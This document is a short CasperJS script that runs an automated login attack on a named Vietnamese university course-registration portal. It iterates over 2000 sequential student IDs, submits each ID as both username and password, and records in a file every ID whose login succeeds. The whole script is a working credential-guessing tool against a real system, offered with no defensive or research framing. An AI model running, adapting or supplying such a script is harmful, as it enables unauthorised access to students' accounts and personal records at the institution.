var casper = require('casper').create();
var fs = require('fs');

var id = parseInt(casper.cli.args[0]);


function search() {
		casper.echo(++id);
		casper.thenOpen('http://daotao.vnu.edu.vn/dkmh/login.asp');

		casper.then(function () {
			this.fillSelectors('form#frmLogin', {
				'input#txtLoginId': id.toString(),
				'input#txtPassword': id.toString(),
				'input#chkSubmit': 'ok'
			}, true);
		});
		
		casper.waitForSelector('title');

		casper.then(function () {
			if (this.getTitle() == 'Cổng thông tin đào tạo') {
				this.echo('Found!');
				fs.write('60-daotao.txt', id.toString() + '\n', 'a');
			}
		});
}

casper.start();

casper.then(function () {
	this.repeat(2000, search);
});

casper.run();
